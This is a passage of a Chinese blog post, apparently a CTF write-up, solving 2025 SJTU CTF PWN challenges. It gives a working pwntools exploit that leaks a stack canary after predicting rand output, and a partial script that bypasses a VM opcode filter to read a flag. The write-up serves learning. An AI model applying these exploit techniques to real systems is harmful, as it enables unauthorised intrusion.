<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>2025-SJTUCTF-PWN | 晚栀Winegee~</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="引言： 2025 SJTU CTF PWN方向题解，包含GuessMaster，ret2vmcode，TheLampSecret，ezshellcode四道赛题">
<meta property="og:type" content="article">
<meta property="og:title" content="2025-SJTUCTF-PWN">
<meta property="og:url" content="https://wing3e.github.io/2025/04/07/2025-SJTU-CTF/index.html">
<meta property="og:site_name" content="晚栀Winegee~">
<meta property="og:description" content="引言： 2025 SJTU CTF PWN方向题解，包含GuessMaster，ret2vmcode，TheLampSecret，ezshellcode四道赛题">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://wing3e.github.io/2025/04/07/2025-SJTU-CTF/image-20250407171225920.png">
<meta property="og:image" content="https://wing3e.github.io/2025/04/07/2025-SJTU-CTF/image-20250407171531799.png">
<meta property="og:image" content="https://wing3e.github.io/2025/04/07/2025-SJTU-CTF/image-20250407171621455.png">
<meta property="og:image" content="https://wing3e.github.io/2025/04/07/2025-SJTU-CTF/image-20250407173614409.png">
<meta property="og:image" content="https://wing3e.github.io/2025/04/07/2025-SJTU-CTF/image-20250407173809271.png">
<meta property="og:image" content="https://wing3e.github.io/2025/04/07/2025-SJTU-CTF/image-20250407174005850.png">
<meta property="og:image" content="https://wing3e.github.io/2025/04/07/2025-SJTU-CTF/image-20250407174038683.png">
<meta property="og:image" content="https://wing3e.github.io/2025/04/07/2025-SJTU-CTF/image-20250407174147507.png">
<meta property="og:image" content="https://wing3e.github.io/2025/04/07/2025-SJTU-CTF/image-20250407174549643.png">
<meta property="og:image" content="https://wing3e.github.io/2025/04/07/2025-SJTU-CTF/image-20250407175550506.png">
<meta property="og:image" content="https://wing3e.github.io/2025/04/07/2025-SJTU-CTF/image-20250407175237999.png">
<meta property="og:image" content="https://wing3e.github.io/2025/04/07/2025-SJTU-CTF/image-20250407175201422.png">
<meta property="og:image" content="https://wing3e.github.io/2025/04/07/2025-SJTU-CTF/image-20250407175601782.png">
<meta property="og:image" content="https://wing3e.github.io/2025/04/07/2025-SJTU-CTF/image-20250407175949495.png">
<meta property="og:image" content="https://wing3e.github.io/2025/04/07/2025-SJTU-CTF/image-20250407180414312.png">
<meta property="og:image" content="https://wing3e.github.io/2025/04/07/2025-SJTU-CTF/image-20250407181050657.png">
<meta property="og:image" content="https://wing3e.github.io/2025/04/07/2025-SJTU-CTF/image-20250407181143202.png">
<meta property="og:image" content="https://wing3e.github.io/2025/04/07/2025-SJTU-CTF/image-20250407181920894.png">
<meta property="og:image" content="https://wing3e.github.io/2025/04/07/2025-SJTU-CTF/image-20250407182200717.png">
<meta property="og:image" content="https://wing3e.github.io/2025/04/07/2025-SJTU-CTF/image-20250407182806742.png">
<meta property="og:image" content="https://wing3e.github.io/2025/04/07/2025-SJTU-CTF/image-20250407184225466.png">
<meta property="og:image" content="https://wing3e.github.io/2025/04/07/2025-SJTU-CTF/image-20250407185122822.png">
<meta property="article:published_time" content="2025-04-07T08:57:21.000Z">
<meta property="article:modified_time" content="2025-04-07T11:01:56.452Z">
<meta property="article:tag" content="Pwn">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wing3e.github.io/2025/04/07/2025-SJTU-CTF/image-20250407171225920.png">
  
    <link rel="alternative" href="/atom.xml" title="晚栀Winegee~" type="application/atom+xml">
  
  
    <link rel="icon" href="/img/avatar.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  
<meta name="generator" content="Hexo 7.0.0"><style>mjx-container[jax="SVG"] {
  direction: ltr;
}

mjx-container[jax="SVG"] > svg {
  overflow: visible;
}

mjx-container[jax="SVG"][display="true"] {
  display: block;
  text-align: center;
  margin: 1em 0;
}

mjx-container[jax="SVG"][justify="left"] {
  text-align: left;
}

mjx-container[jax="SVG"][justify="right"] {
  text-align: right;
}

g[data-mml-node="merror"] > g {
  fill: red;
  stroke: red;
}

g[data-mml-node="merror"] > rect[data-background] {
  fill: yellow;
  stroke: none;
}

g[data-mml-node="mtable"] > line[data-line] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > rect[data-frame] {
  stroke-width: 70px;
  fill: none;
}

g[data-mml-node="mtable"] > .mjx-dashed {
  stroke-dasharray: 140;
}

g[data-mml-node="mtable"] > .mjx-dotted {
  stroke-linecap: round;
  stroke-dasharray: 0,140;
}

g[data-mml-node="mtable"] > svg {
  overflow: visible;
}

[jax="SVG"] mjx-tool {
  display: inline-block;
  position: relative;
  width: 0;
  height: 0;
}

[jax="SVG"] mjx-tool > mjx-tip {
  position: absolute;
  top: 0;
  left: 0;
}

mjx-tool > mjx-tip {
  display: inline-block;
  padding: .2em;
  border: 1px solid #888;
  font-size: 70%;
  background-color: #F8F8F8;
  color: black;
  box-shadow: 2px 2px 5px #AAAAAA;
}

g[data-mml-node="maction"][data-toggle] {
  cursor: pointer;
}

mjx-status {
  display: block;
  position: fixed;
  left: 1em;
  bottom: 1em;
  min-width: 25%;
  padding: .2em .4em;
  border: 1px solid #888;
  font-size: 90%;
  background-color: #F8F8F8;
  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

.MathJax path {
  stroke-width: 3;
}

mjx-container[display="true"] {
  overflow: auto hidden;
}

mjx-container[display="true"] + br {
  display: none;
}
</style></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
				<img lazy-src="/img/avatar.jpg" class="js-avatar">
			
		</a>

		<hgroup>
			<h1 class="header-author"><a href="/"></a></h1>
		</hgroup>

		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">Home</a></li>
				        
							<li><a href="/archives">Archives</a></li>
				        
							<li><a href="/tags">Tags</a></li>
				        
							<li><a href="/introduction">About me</a></li>
				        
							<li><a target="_blank" rel="noopener" href="http://www.winegee.xyz/">Winegee的书房</a></li>
				        
							<li><a href="/log">Maintenance log</a></li>
				        
						</ul>
					</nav>
					<nav class="half-header-menu">
						<a class="hide">Home</a>
						<a>Tags</a>
						<a>Links</a>
						<a>About</a>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
								<a class="github" target="_blank" href="https://github.com/wing3e" title="github">github</a>
					        
								<a class="weibo" target="_blank" href="#" title="weibo">weibo</a>
					        
						</div>
						<!-- music -->
						
							<!-- <div style="position: absolute; bottom: 120px; left: auto; width: 85%;"> -->
							<div style="position: absolute; left: auto; width: 85%;">
								<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=220 height=86 src="//music.163.com/outchain/player?type=2&id=1805347343&auto=1&height=66"></iframe>
							</div>
						
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/BeginCTF/" style="font-size: 10px;">BeginCTF</a> <a href="/tags/CAN-IDS/" style="font-size: 10px;">CAN-IDS</a> <a href="/tags/CTF/" style="font-size: 12px;">CTF</a> <a href="/tags/MoeCTF/" style="font-size: 10px;">MoeCTF</a> <a href="/tags/Pwn/" style="font-size: 20px;">Pwn</a> <a href="/tags/Reverse/" style="font-size: 12px;">Reverse</a> <a href="/tags/ZJUCTF/" style="font-size: 10px;">ZJUCTF</a> <a href="/tags/eBPF/" style="font-size: 10px;">eBPF</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E7%90%86%E8%AE%BA/" style="font-size: 10px;">信息理论</a> <a href="/tags/%E5%A0%86%E5%88%A9%E7%94%A8/" style="font-size: 12px;">堆利用</a> <a href="/tags/%E5%AE%89%E6%B4%B5%E6%9D%AF/" style="font-size: 10px;">安洵杯</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 10px;">密码学</a> <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" style="font-size: 14px;">操作系统</a> <a href="/tags/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/" style="font-size: 16px;">数学建模</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/" style="font-size: 12px;">计算机体系结构</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9FII/" style="font-size: 18px;">计算机系统II</a> <a href="/tags/%E8%BD%A6%E8%81%94%E7%BD%91/" style="font-size: 10px;">车联网</a>
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://note.jiepeng.tech/">JPGG&#39;s NoteBook</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://47.99.33.238/">Tauhkc&#39;s Note</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://xymmsnotebook.gitbook.io/noteofxymm/">xy猫猫</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://zjuccnocc.github.io/Home">CCnocc</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://hzeroyuke.github.io/my_blog/">华零的Notebook</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://miraclemaster.cn/">恩浩gg</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://116.62.208.33/">SLXjj没想好标题</a>
			        
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://zjulwind.github.io/home/">ZY老师</a>
			        
			        </div>
				</section>
				

				
				
				<section class="switch-part switch-part4">
				
					<div id="js-aboutme">aaa</div>
				</section>
				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide"></h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="/img/avatar.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author"></h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">Home</a></li>
		        
					<li><a href="/archives">Archives</a></li>
		        
					<li><a href="/tags">Tags</a></li>
		        
					<li><a href="/introduction">About me</a></li>
		        
					<li><a target="_blank" rel="noopener" href="http://www.winegee.xyz/">Winegee的书房</a></li>
		        
					<li><a href="/log">Maintenance log</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="https://github.com/wing3e" title="github">github</a>
			        
						<a class="weibo" target="_blank" href="#" title="weibo">weibo</a>
			        
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap"><article id="post-2025-SJTU-CTF" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2025/04/07/2025-SJTU-CTF/" class="article-date">
  	<time datetime="2025-04-07T08:57:21.000Z" itemprop="datePublished">2025-04-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      2025-SJTUCTF-PWN
      
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
	</div>

        

        
        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>
<h3 id="引言">引言：</h3>
<p>2025 SJTU CTF PWN方向题解，包含GuessMaster，ret2vmcode，TheLampSecret，ezshellcode四道赛题</p>
<span id="more"></span>
<h3 id="guessmaster">1 GuessMaster</h3>
<p>看程序是一个随机数预测，一百次预测成功之后就会给两次溢出机会。</p>
<p><img src="/2025/04/07/2025-SJTU-CTF/image-20250407171225920.png"></p>
<p>程序开了canary，<code>time(0LL)</code>就是拿当前时间戳，只要网速够快就可以保证本地和远端时间戳同步，加上<code>offset</code>就可以得到随机数种子。</p>
<p>这个<code>offset</code>虽然在IDA里看是<code>0xa</code>，但是在start里面好像会对这个变量做一堆莫名其妙的变化。GDB动调一下发现最后的offset是<code>0x6e</code></p>
<p><img src="/2025/04/07/2025-SJTU-CTF/image-20250407171531799.png"></p>
<p><img src="/2025/04/07/2025-SJTU-CTF/image-20250407171621455.png"></p>
<p>程序还给了个后门函数，那就直接随机数预测+canary泄露+ret2text一把梭：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">elf = ctypes.cdll.LoadLibrary(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">rand = elf.rand</span><br><span class="line">srand = elf.srand</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">context.log_level = <span class="string">"DEBUG"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process("./pwn")</span></span><br><span class="line">p = remote(<span class="string">"instance.penguin.0ops.sjtu.cn"</span>, <span class="number">18487</span>)</span><br><span class="line"><span class="comment"># libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line"></span><br><span class="line">epoch_time = <span class="built_in">int</span>(time.time())  </span><br><span class="line"></span><br><span class="line">random_numbers = []</span><br><span class="line"></span><br><span class="line">srand(epoch_time + <span class="number">0x6e</span>)</span><br><span class="line"><span class="comment"># srand(epoch_time + 0x6e)</span></span><br><span class="line"></span><br><span class="line">success(<span class="string">"epoch time =&gt; {}"</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(epoch_time + <span class="number">0xa</span>)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    p.recv()</span><br><span class="line">    randnum = rand()</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(randnum))</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">b"a"</span> * <span class="number">0x109</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(payload)</span><br><span class="line"></span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">stack_pointer = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b"\x00"</span>))</span><br><span class="line">success(<span class="string">"canary =&gt; {}"</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(canary)))</span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">b"a"</span> * <span class="number">0x108</span> + p64(canary) + <span class="string">b"a"</span> * <span class="number">8</span> + <span class="string">b"\x93"</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="ret2vmcode">2 ret2vmcode</h3>
<p>一个opcode的题目，给了很多操作原语，先阅读理解一下。</p>
<p><img src="/2025/04/07/2025-SJTU-CTF/image-20250407173614409.png"></p>
<p>一个操作原语是9个字节，第一个字节表明这是什么操作，然后剩下八个字节前四个代表一个操作寄存器，后四个代表一个操作寄存器，而且程序的寄存器只有4个可用：</p>
<p><img src="/2025/04/07/2025-SJTU-CTF/image-20250407173809271.png"></p>
<p>把所有代码给<code>Claude 3.7 sonnet</code>，让他给我阅读理解一下。</p>
<p>这个程序一共分配<code>0x300</code>字节大小的虚拟内存空间，并且表明前<code>0X100</code>字节是指令区，后<code>0x200</code>字节是数据区。</p>
<p>可以通过操作原语修改vm内存区的任意地址内存，这里并没有任何限制：</p>
<p><img src="/2025/04/07/2025-SJTU-CTF/image-20250407174005850.png"></p>
<p>发现程序还提供了一个<code>syscall</code>的操作原语：</p>
<p><img src="/2025/04/07/2025-SJTU-CTF/image-20250407174038683.png"></p>
<p>很给的<code>ORW</code>，所以本题的目的就是通过<code>ORW</code>来获取<code>flag</code>的内容。</p>
<p>但在main函数中对输入的字符有限制，不能出现<code>0xf9</code>, 对应sys操作的标识符。</p>
<p><img src="/2025/04/07/2025-SJTU-CTF/image-20250407174147507.png"></p>
<p>没关系，从<code>store</code>和<code>load</code>中可以看到程序并没有对指令操作的地址有任何限制，也就是我们可以通过前面的指令去修改后面指令的标识符，来绕过这个检测。</p>
<p>思路可行，exp如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"i386"</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">VM</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, target</span>):</span><br><span class="line">        self.p = target</span><br><span class="line">        self.opcodes = {</span><br><span class="line">            <span class="string">'imm'</span>: <span class="number">0xF1</span>,</span><br><span class="line">            <span class="string">'add'</span>: <span class="number">0xF2</span>,</span><br><span class="line">            <span class="string">'sub'</span>: <span class="number">0xF3</span>,</span><br><span class="line">            <span class="string">'xor'</span>: <span class="number">0xF4</span>,</span><br><span class="line">            <span class="string">'push'</span>: <span class="number">0xF5</span>,</span><br><span class="line">            <span class="string">'pop'</span>: <span class="number">0xF6</span>,</span><br><span class="line">            <span class="string">'load'</span>: <span class="number">0xF7</span>,</span><br><span class="line">            <span class="string">'store'</span>: <span class="number">0xF8</span>,</span><br><span class="line">            <span class="string">'sys'</span>: <span class="number">0xF9</span>,</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">        self.SYS_READ = <span class="number">1</span></span><br><span class="line">        self.SYS_WRITE = <span class="number">2</span></span><br><span class="line">        self.SYS_OPEN = <span class="number">3</span></span><br><span class="line">        self.filename_addr = <span class="literal">None</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wait_for_prompt</span>(<span class="params">self</span>):</span><br><span class="line">        self.p.recvuntil(<span class="string">b"Input your vmcode:"</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_vm_memory_addr</span>(<span class="params">self</span>):</span><br><span class="line">        self.p.recvuntil(<span class="string">b"VM Memory Initialized at "</span>)</span><br><span class="line">        addr_str = self.p.recvuntil(<span class="string">b".\n"</span>).strip(<span class="string">b".\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(addr_str, <span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">make_instruction</span>(<span class="params">self, opcode, arg1=<span class="number">0</span>, arg2=<span class="number">0</span></span>):</span><br><span class="line">        <span class="keyword">if</span> opcode == <span class="string">'sys'</span>:</span><br><span class="line">            <span class="keyword">return</span> p8(self.opcodes[<span class="string">'store'</span>]) + p32(arg1) + p32(arg2)</span><br><span class="line">        <span class="keyword">return</span> p8(self.opcodes[opcode]) + p32(arg1) + p32(arg2)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">imm</span>(<span class="params">self, value, reg=<span class="number">0</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self.make_instruction(<span class="string">'imm'</span>, reg, value)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">self, dst=<span class="number">0</span>, src=<span class="number">0</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self.make_instruction(<span class="string">'add'</span>, dst, src)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">self, dst=<span class="number">0</span>, src=<span class="number">0</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self.make_instruction(<span class="string">'sub'</span>, dst, src)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">self, dst=<span class="number">0</span>, src=<span class="number">0</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self.make_instruction(<span class="string">'xor'</span>, dst, src)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">push</span>(<span class="params">self, reg=<span class="number">0</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self.make_instruction(<span class="string">'push'</span>, reg)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pop</span>(<span class="params">self, reg=<span class="number">0</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self.make_instruction(<span class="string">'pop'</span>, reg)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">self, dst=<span class="number">0</span>, src=<span class="number">0</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self.make_instruction(<span class="string">'load'</span>, dst, src)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">self, dst=<span class="number">0</span>, src=<span class="number">0</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self.make_instruction(<span class="string">'store'</span>, dst, src)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sys</span>(<span class="params">self, syscall_num=<span class="number">0</span></span>):</span><br><span class="line">        <span class="keyword">return</span> self.make_instruction(<span class="string">'sys'</span>, syscall_num)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">patch_opcode</span>(<span class="params">self, instruction_addr, new_opcode</span>):</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            self.imm(<span class="number">1</span>, <span class="number">0</span>),</span><br><span class="line">            self.add(instruction_addr, <span class="number">0</span>)  </span><br><span class="line">        ]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send_code</span>(<span class="params">self, code</span>):</span><br><span class="line">        self.wait_for_prompt()</span><br><span class="line">        self.p.sendline(code[:<span class="number">0x100</span>])</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute_code</span>(<span class="params">self, instructions</span>):</span><br><span class="line">        vmcode = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">for</span> instr <span class="keyword">in</span> instructions:</span><br><span class="line">            vmcode += instr</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(vmcode) &gt; <span class="number">0x100</span>:</span><br><span class="line">            log.warning(<span class="string">f"VM code is <span class="subst">{<span class="built_in">len</span>(vmcode)}</span> bytes, truncating to 0x100 bytes!"</span>)</span><br><span class="line">            vmcode = vmcode[:<span class="number">0x100</span>]</span><br><span class="line">            </span><br><span class="line">        self.send_code(vmcode)</span><br><span class="line">        <span class="keyword">return</span> self.p.recv()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">setup</span>(<span class="params">self</span>):</span><br><span class="line">        self.vm_mem = self.get_vm_memory_addr()</span><br><span class="line">        self.data_section = self.vm_mem + <span class="number">0x100</span></span><br><span class="line">        self.code_section = self.vm_mem</span><br><span class="line">        self.filename_addr = self.data_section + <span class="number">0x100</span></span><br><span class="line">        log.info(<span class="string">f"VM memory at: <span class="subst">{<span 